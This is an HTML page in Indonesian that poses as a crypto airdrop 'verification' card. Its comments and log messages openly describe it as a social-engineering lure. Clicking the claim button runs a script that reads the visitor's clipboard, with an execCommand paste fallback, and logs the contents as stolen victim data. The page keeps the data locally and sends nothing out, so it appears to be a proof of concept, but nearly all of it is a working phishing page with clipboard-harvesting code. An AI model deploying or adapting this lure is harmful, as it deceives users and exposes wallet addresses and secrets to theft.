<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Reward & Airdrop - Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 90vh; margin: 0; }
        .card { background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 10px; font-size: 1.4rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 20px; }
        .btn-claim { background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; border: none; padding: 14px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: opacity 0.2s; }
        .btn-claim:active { opacity: 0.8; }
        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 140px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.8rem; text-align: left; margin-top: 20px; font-family: monospace; }
        .fake-box { margin-top: 15px; }
        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🎉 Claim AQUA Airdrop</h2>
        <p>Verifikasi alamat dompet Anda dengan menempelkan (Paste) data verifikasi untuk melanjutkan klaim.</p>
        
        <!-- Umpan Social Engineering: Tombol disamarkan sebagai tombol klaim hadiah -->
        <button class="btn-claim" onclick="pancingClipboard()">KLIK UNTUK VERIFIKASI & KLAIM</button>
        
        <div class="fake-box">
            <input type="text" id="targetInput" placeholder="Tekan tombol di atas untuk sinkronisasi..." readonly>
        </div>

        <div id="log">[INFO] Social engineering UI ready. Waiting for user interaction.</div>
    </div>

    <script>
        function log(msg) {
            const logBox = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logBox.innerText += `\n[${time}] ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        async function pancingClipboard() {
            log("[PROSES] Memicu fungsi pembacaan clipboard...");
            
            try {
                // Meminta akses clipboard yang akan memunculkan prompt/tombol paste dari sistem browser
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    document.getElementById('targetInput').value = text;
                    log(`[BERHASIL] Data clipboard korban berhasil dicuri: ${text}`);
                    alert("Airdrop Terverifikasi! Data tersinkron: " + text);
                } else {
                    log("[INFO] Menggunakan metode fallback input fokus...");
                    const inputElem = document.getElementById('targetInput');
                    inputElem.focus();
                    document.execCommand('paste');
                    if(inputElem.value) {
                        log(`[BERHASIL] Silent paste via execCommand: ${inputElem.value}`);
                    }
                }
            } catch (err) {
                log(`[GAGAL/DIBLOKIR] Pengguna menolak atau dibatasi browser: ${err.message}`);
            }
        }
    </script>

</body>
</html>
